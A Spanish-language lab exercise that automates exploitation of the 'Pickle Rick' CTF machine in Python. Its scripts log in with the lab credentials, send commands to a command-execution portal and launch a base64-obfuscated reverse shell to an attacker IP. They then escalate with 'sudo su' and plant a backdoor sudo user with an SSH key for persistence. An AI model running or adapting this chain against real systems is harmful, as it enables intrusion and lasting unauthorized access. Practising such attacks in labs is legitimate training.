# Automatización del CTF Pickle Rick

## Contexto del ejercicio

Este ejercicio consiste en **automatizar el proceso de explotación de la máquina Pickle Rick una vez ya ha sido resuelta manualmente**.

El objetivo **NO es descubrir la vulnerabilidad**, ya que esta ya se conoce, sino **reproducir automáticamente los pasos realizados durante la resolución del CTF**.

Es decir, el script se desarrollará **conociendo previamente**:

- Los endpoints de la aplicación
- Los parámetros necesarios
- La vulnerabilidad presente en el portal
  --> Las vulnerabilidades halladas en el portal es la ejecucion de codigo
- Los comandos necesarios para obtener acceso
  --> Para poder obtener acceso hay que insertar una revershell en base64 y estar a la escucha
- El método de escalada de privilegios
  --> Comando para obtener acceso privilegiado: sudo su 

Este ejercicio busca practicar **automatización de ataques y scripting en Python**.

---

# Objetivo final

Crear un script en Python capaz de **reproducir automáticamente la explotación previamente realizada manualmente**.

El flujo que debe automatizar el script es:

1. Autenticarse en la aplicación web.
2. Mantener la sesión HTTP.
3. Enviar comandos al portal vulnerable.
4. Ejecutar una reverse shell.
5. Recibir la conexión en la máquina atacante.
6. Escalar privilegios a root.
7. Crear persistencia en el sistema.
8. Configurar acceso por SSH mediante claves.

---

# Fase 1 — Análisis de la petición de Login

Durante la resolución manual del CTF se identificó que la aplicación utiliza un sistema de login.

En esta fase se debe **analizar la petición HTTP que realiza el navegador al iniciar sesión**.

## Tareas

1. Abrir la página web de la máquina. 
2. Abrir las herramientas de desarrollador del navegador.
3. Acceder a la pestaña **Network**.
4. Realizar el login en la aplicación.
5. Localizar la petición correspondiente.

## Identificar

- Método HTTP --> POST
- Endpoint --> http://10.128.161.83/login.php
- Parámetros enviados --> username:password = R1ckRul3s:Wubbalubbadubdub
- Posibles cookies de sesión

Ejemplo conceptual usando la libreria requests para acceder a la web:

```
import requests as re

respuesta = re.post('http://10.128.161.83/')

if respuesta.status_code == 200:
        print('Conexion establecida. Imprimiendo respuesta:')
        print(respuesta)
elif respuesta.status_code == 404:
        print('Error de conexion!')
```

---

# Fase 2 — Reproducir el Login con Python

Una vez identificada la petición, se debe reproducir el login utilizando Python.
El objetivo es **simular el comportamiento del navegador** mediante una petición HTTP.

## Investigar

- Librería `requests`
- Envío de datos mediante POST
- Manejo de respuestas HTTP

# Fase 3 — Gestión de Sesión

Después del login, el servidor genera una **cookie de sesión**.

Para poder interactuar con otras secciones de la web es necesario **mantener esa sesión activa**.

Ejemplo conceptual usando la libreria requests para escribir las credenciales + crear sesion:

## Investigar

- Cookies HTTP
- Uso de sesiones en Python

```
import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.161.83/login.php'
CREDENCIALES = {
        'username' : 'R1ckRul3s',
        'password': 'Wubbalubbadubdub'
}

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
respuesta = sesion.post(LOGIN_ENDPOINT,data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if respuesta.status_code == 200:
        print('Peticion de login enviada. Verificando...')
        if 'Portal Login Page' in respuesta.text:
                print('Login exitoso! Mostrando las cookies de sesion:')
                print(sesion.cookies)
        else:
                print('Login fallido!')
else:
        print('Error de conexion!')
```
---

# Fase 4 — Análisis del Portal Vulnerable

Durante la resolución manual del CTF se identificó que el portal permite **ejecutar comandos en el servidor**.

Debes analizar la petición que se envía cuando se introduce un comando.

## Tareas

1. Acceder al portal autenticado.
2. Ejecutar un comando simple.
3. Observar la petición generada en la pestaña Network.

Ejemplo conceptual de RCE en el panel tras logearnos:

import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
        'username' : 'R1ckRul3s',
        'password' : 'Wubbalubbadubdub',
        'sub' : 'Login'
}

# Defino el ednpoint y el payload necesarios para RCE
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'
PAYLOAD = {
        'command' : 'whoami',
        'sub': 'Execute'
}

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT,data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
        print('Peticion de login enviada. Verificando...')
        if 'Command Panel' in estado_login.text:
                print('Login exitoso! Mostrando las cookies de sesion:')
                print(sesion.cookies)
# Ahora tras un intento exitoso se va a probar a realizar RCE con POST y el Endpoint ()
                rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD)
                if rce_respuesta.status_code == 200:
                        print('El comando se ha ejecutado satisfactoriamente. Resultado:')
                        print(rce_respuesta.text)
                else:
                        print('Ha habido un error')
        else:
                print('Login fallido!')
else:
        print('Error de conexion!')

---

# Fase 5 — Automatizar la ejecución de comandos

El script debe ser capaz de enviar comandos al portal vulnerable.

Se recomienda implementar una función similar a la que se muestra en la act. de la PoC anterior:

import requests as re

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.167.86/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint y el payload necesarios para RCE
RCE_ENDPOINT = 'http://10.128.167.86/portal.php'

# Con esta func los comando que se ejecuten seran dinamicos, como una pseudshell
def ejecutar_comandos(cmd):
    PAYLOAD_DIN = {
        'command' : cmd, # Se ejecuta los comandos que escribimos desde la terminal
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor cada vez que se llame a la funcion
    rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_DIN)
    
    if rce_respuesta.status_code == 200:
        # Se intenta limpiar la salida y asi comprobar si hubo o no respuesta
        try:
            return rce_respuesta.text.split('<pre>')[1].split('</pre>')[0].strip()
        except IndexError:
            return "[!] Comando sin salida o bloqueado."
    else:
        return f"[!] Error HTTP: {rce_respuesta.status_code}"

# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso entraremos en un bucle While para ejecutar RCE dinamicamente
        print('-' * 50)
        print("Consola interactiva. Escribe 'exit' si deseas salir.")
        print('-' * 50)
        while True:
            comando_recibido = input('pickle-rick@usuario-nonroot:~$ ') # Input para guardar los comandos a ejecutar
            # La siguiente condition comprueba si el usuario desea salir de la pseudoshell
            if comando_recibido.lower() == 'exit':
                print('Cerrando la conexion...')
                break
            else:
                rce_respuesta = ejecutar_comandos(comando_recibido) # Llamando a la siguiente funcion
                print(rce_respuesta)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')

---

# Fase 6 — Reverse Shell

Una vez confirmada la ejecución de comandos, se utilizará esa capacidad para lanzar una **reverse shell hacia la máquina atacante**.

Conceptos a investigar:

- reverse shells
- netcat
- sockets

Arquitectura:

victima ----> atacante  
     reverse shell

---

# Fase 7 — Listener en paralelo

La reverse shell requiere que el atacante esté **escuchando conexiones entrantes**.

El listener debe ejecutarse **antes de enviar la reverse shell**.

Para automatizar este proceso se utilizarán **threads en Python**, permitiendo ejecutar dos procesos en paralelo:

import payload as pa # Esto permite usar la funcion que contiene la carga maliciosa
import base64 as ba # Imporamos esta libreria para realizar el encoding y pasar los filtros
import socket # Con esta libreria configuramos nuestro listener (netcat casero)
import time # Para evitar problemas de race condition en nuestro listener
import threading # Necesaria para ejecutar procesos simultaneamente

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.129.157.165/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint donde se va a mandar el payload
RCE_ENDPOINT = 'http://10.129.157.165/portal.php'

# Defino las constantes de IP y Puerto para la ejecucion de la llamada y poder recibirla posteriormente
IP_HOST = '192.168.132.194'
PORT_LISTENER = 4445


# En esta funcion se define la ejecucion remota del payload para recibir la llamada desde el server
def ejecutar_comando(payload):
    PAYLOAD_RSHELL = {
        'command' : payload,
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor y anadimos timeout (la ejecucion se quedara congelada ya que es una rshell)
    try:
        rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_RSHELL, timeout=3)
    # Capturamos el timeout, que significa exito!
    except re.exceptions.ReadTimeout:
        return "Reverse Shell lanzada."

# Esta funcion es la que queda a la escucha y pendiente de una conexion para ejecutar la reverse shell y comandos
def listener(puerto):
    # Primero se crea el socket y se configura
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', puerto))
    s.listen(1)
    print(f"Escuchando en el puerto {puerto}...")
    # Esperamos a victima (bloq hasta recibir la llamada de la revshell)
    conexion, direccion = s.accept()
    print(f'Conexión recibida de {direccion[0]}!')
    # Mandamos automaticamente el siguiente comando con .send
    conexion.send(b"whoami\n")
    time.sleep(1) # Despues del comando anadimos un sleep para asegurarnos de que lo procese
    # Ahora con .recv y decode almacenamos la respuesta del server y la imprimimos por pantalla
    respuesta_server = conexion.recv(4096).decode() # Aumentamos la cantidad de datos a recolectar
    print(f"El servidor dice que somos: {respuesta_server}")
    # Cerramos la conexion
    conexion.close()
    s.close()
# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso vamos a decirle a la maquina que nos llame direcamente (reverse shell)
        print('-' * 50)
        print("REALIZANDO REVERSE SHELL --> COGIENDO LLAMADA P4445 (Listener)")
        print('-' * 50)
        # Antes de mandar el payload, arrancamos el listener y esperamos 1 segundo evitando race conditions
        hilo = threading.Thread(target=listener, args=(PORT_LISTENER,))
        hilo.start()
        time.sleep(1)
        # Realizo una llamada a la funcion importada de payload as pa (reverse_shell(ip, puerto))
        payload_raw = pa.reverse_shell(IP_HOST, PORT_LISTENER)
        # print(payload_raw) # Prueba del contenido en crudo del payload
        payload_base64 = ba.b64encode(payload_raw.encode()).decode() # Realizamos la conversion necesaria b64
        # Elaboramos el comando que va a ejecutar
        payload_cmd = f"echo '{payload_base64}' | base64 -d | bash"
        print(f"Payload ofuscado listo para enviar...")
        respuesta_payload = ejecutar_comando(payload_cmd)
        print(respuesta_payload)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')

---

# Fase 8 — Escalada de privilegios

Una vez obtenida la shell en la máquina víctima, el siguiente paso es escalar privilegios.

Durante la resolución manual del CTF se identificó el método de escalada.

---

# Fase 9 — Persistencia

Una vez obtenidos privilegios de root, se configurará persistencia en el sistema.

## Tareas

1. Crear un nuevo usuario en el sistema.
2. Asignarle privilegios sudo.

PoC de las fases 8 y 9, mostrando como ahora somos el usuario gacker y tenemos permiso de sudo ejecutando sudo whoami y
viendo como nos devuelve como respuesta root:

(.venv) gabri@GGA-TPX23:~/Documentos/hacking-etico-master$ python ctf/pickle-rick/archivo_pocs/PoC-07/PoC-07-Persistencia.py 
Peticion de login enviada. Verificando...
Login exitoso! Mostrando las cookies de sesion: <RequestsCookieJar[<Cookie PHPSESSID=s09a5p0oqa2972kuv6128uccf2 for 10.128.151.11/>]>
--------------------------------------------------
REALIZANDO REVERSE SHELL --> COGIENDO LLAMADA P4445 (Listener)
--------------------------------------------------
Escuchando en el puerto 4445...
Payload ofuscado listo para enviar...
Conexión recibida de 10.128.151.11!
El servidor dice que somos: $ sudo su
useradd -m -s /bin/bash gacker
echo 'gacker:gacker' | chpasswd
usermod -aG sudo gacker
sudo su gacker
whoami
echo 'gacker' | sudo -S whoami
root@ip-10-128-151-11:/var/www/html# useradd -m -s /bin/bash gacker
useradd: user 'gacker' already exists
root@ip-10-128-151-11:/var/www/html# echo 'gacker:gacker' | chpasswd
root@ip-10-128-151-11:/var/www/html# usermod -aG sudo gacker
root@ip-10-128-151-11:/var/www/html# sudo su gacker
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

gacker@ip-10-128-151-11:/var/www/html$ whoami
gacker
gacker@ip-10-128-151-11:/var/www/html$ echo 'gacker' | sudo -S whoami
[sudo] password for gacker: root
gacker@ip-10-128-151-11:/var/www/html$ 
Reverse Shell lanzada.
(.venv) gabri@GGA-TPX23:~/Documentos/hacking-etico-master

---

# Fase 10 — Acceso por SSH

En lugar de depender de la reverse shell, se configurará acceso permanente mediante SSH.

## Procedimiento

1. Generar un par de claves en la máquina atacante.
2. Copiar la clave pública a la máquina víctima.
3. Guardarla en el archivo:

~/.ssh/authorized_keys

import requests as re
import payload as pa # Esto permite usar la funcion que contiene la carga maliciosa
import base64 as ba # Imporamos esta libreria para realizar el encoding y pasar los filtros
import socket # Con esta libreria configuramos nuestro listener (netcat casero)
import time # Para evitar problemas de race condition en nuestro listener
import threading # Necesaria para ejecutar procesos simultaneamente
# Modulos para la ejecucion de comandos en el sistema
import os
import subprocess

# Se inicia la variable sesion para guardar las cookies
sesion = re.Session()

# Defino las constantes del PoC de requests + session
LOGIN_ENDPOINT = 'http://10.128.151.11/login.php'
CREDENCIALES = {
    'username' : 'R1ckRul3s',
    'password' : 'Wubbalubbadubdub',
    'sub' : 'Login'
}

# Defino el ednpoint donde se va a mandar el payload
RCE_ENDPOINT = 'http://10.128.151.11/portal.php'

# Defino las constantes de IP y Puerto para la ejecucion de la llamada y poder recibirla posteriormente
IP_HOST = '192.168.132.194'
PORT_LISTENER = 4445

# Defino la ruta donde se guardara la llave
PATH_LLAVE = "llave_gacker"

# Compruebo si existe la llave, si no, la creo
if not os.path.exists(PATH_LLAVE):
    print(f"No se encontro la llave en la ruta: {PATH_LLAVE}")
    print("Generando par de llaves...")
    subprocess.run(["ssh-keygen", "-t", "rsa", "-b", "4096", "-f", PATH_LLAVE, "-N", ""])
    print(f"Par de llaves generadas en {PATH_LLAVE}")

# Leemos la llave publica
with open(PATH_LLAVE + ".pub", "r") as llave:
    llave_publica = llave.read().strip() # Eliminamos saltos de linea y evitamos problemas de inyeccion

# En esta funcion se define la ejecucion remota del payload para recibir la llamada desde el server
def ejecutar_comando(payload):
    PAYLOAD_RSHELL = {
        'command' : payload,
        'sub': 'Execute'
    }

    # Mandamos el payload al servidor y anadimos timeout (la ejecucion se quedara congelada ya que es una rshell)
    try:
        rce_respuesta = sesion.post(RCE_ENDPOINT, data = PAYLOAD_RSHELL, timeout=3)
    # Capturamos el timeout, que significa exito!
    except re.exceptions.ReadTimeout:
        return "Reverse Shell lanzada."

# Esta funcion es la que queda a la escucha y pendiente de una conexion para ejecutar la reverse shell y comandos
def listener(puerto):
    # Primero se crea el socket y se configura
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind(('0.0.0.0', puerto))
    s.listen(1)
    print(f"Escuchando en el puerto {puerto}...")
    # Esperamos a victima (bloq hasta recibir la llamada de la revshell)
    conexion, direccion = s.accept()
    print(f'Conexión recibida de {direccion[0]}!')
    # Mandamos automaticamente el siguiente comando con .send
    conexion.send(b"sudo su\n") # Escalamos con sudo su ya que cualquier usuario puede elevarse sin passwd
    conexion.send(b"useradd -m -s /bin/bash gacker\n") # Creo un usuario con home y shell
    conexion.send(b"echo 'gacker:gacker' | chpasswd\n") # Se le asigna una contrasena al usuario
    conexion.send(b"usermod -aG sudo gacker\n") # Anadimos el usuario gacker al grupo sudo
    conexion.send(b"mkdir -p /home/gacker/.ssh\n") # Creamos directorio ssh del usuario
    cmd_llave = f"echo '{llave_publica}' > /home/gacker/.ssh/authorized_keys\n"
    conexion.send(cmd_llave.encode()) # Inyectamos la clave previamente almacenada
    conexion.send(b"chmod 700 /home/gacker/.ssh\n") # Permisos para la carpeta de SSH
    conexion.send(b"chmod 600 /home/gacker/.ssh/authorized_keys\n") # Permisos para el archivo de SSH
    conexion.send(b"chown -R gacker:gacker /home/gacker/.ssh\n") # Asignamos la propiedad a gacker
    conexion.send(b"cat /home/gacker/.ssh/authorized_keys\n") # Hacemos un cat de la llave publica almacenada
    conexion.send(b"sudo su gacker\n") # Iniciamos sesion como usuario gacker
    conexion.send(b"whoami\n") # Verificamos que somos gacker
    print("\n" + "-" * 50)
    print("Llave enviada, listo para ejecutar una conexion SSH: ssh -i llave_gacker gacker@10.128.151.11")
    print("-" * 50 + "\n")
    time.sleep(1) # Despues del comando anadimos un sleep para asegurarnos de que lo procese
    # Ahora con .recv y decode almacenamos la respuesta del server y la imprimimos por pantalla
    respuesta_server = conexion.recv(4096).decode() # Aumentamos la cantidad de datos a recolectar
    print(f"El servidor dice que somos: {respuesta_server}")
    # Cerramos la conexion
    conexion.close()
    s.close()
# Ahora hay que acceder con el metodo POST (Endpoint + credenciales)
estado_login = sesion.post(LOGIN_ENDPOINT, data = CREDENCIALES)

# Se anaden las siguientes comprobaciones para verificar el resultado
if estado_login.status_code == 200:
    print('Peticion de login enviada. Verificando...')
    if 'Command Panel' in estado_login.text:
        print(f'Login exitoso! Mostrando las cookies de sesion: {sesion.cookies}')
        # Tras el login exitoso vamos a decirle a la maquina que nos llame direcamente (reverse shell)
        print('-' * 50)
        print("REALIZANDO REVERSE SHELL --> COGIENDO LLAMADA P4445 (Listener)")
        print('-' * 50)
        # Antes de mandar el payload, arrancamos el listener y esperamos 1 segundo evitando race conditions
        hilo = threading.Thread(target=listener, args=(PORT_LISTENER,))
        hilo.start()
        time.sleep(1)
        # Realizo una llamada a la funcion importada de payload as pa (reverse_shell(ip, puerto))
        payload_raw = pa.reverse_shell(IP_HOST, PORT_LISTENER)
        # print(payload_raw) # Prueba del contenido en crudo del payload
        payload_base64 = ba.b64encode(payload_raw.encode()).decode() # Realizamos la conversion necesaria b64
        # Elaboramos el comando que va a ejecutar
        payload_cmd = f"echo '{payload_base64}' | base64 -d | bash"
        print(f"Payload ofuscado listo para enviar...")
        respuesta_payload = ejecutar_comando(payload_cmd)
        print(respuesta_payload)
    else:
        print('Login fallido!')
else:
    print('Error de conexion!')


---

# Fase 11 — Conexión final

Una vez configurado el acceso por clave pública, se puede cerrar la reverse shell y conectarse mediante SSH.

Ejemplo:

ssh usuario@ip_victima

---

# Entregables

El proyecto final debe contener al menos los siguientes archivos:

/exploit.py  
/enunciado.md  
/README.txt  

---

# Objetivo educativo

Este ejercicio permite practicar:

- análisis de tráfico HTTP
- automatización de explotación web
- scripting en Python
- manejo de sesiones HTTP
- reverse shells
- programación concurrente (threading)
- escalada de privilegios
- persistencia en sistemas Linux
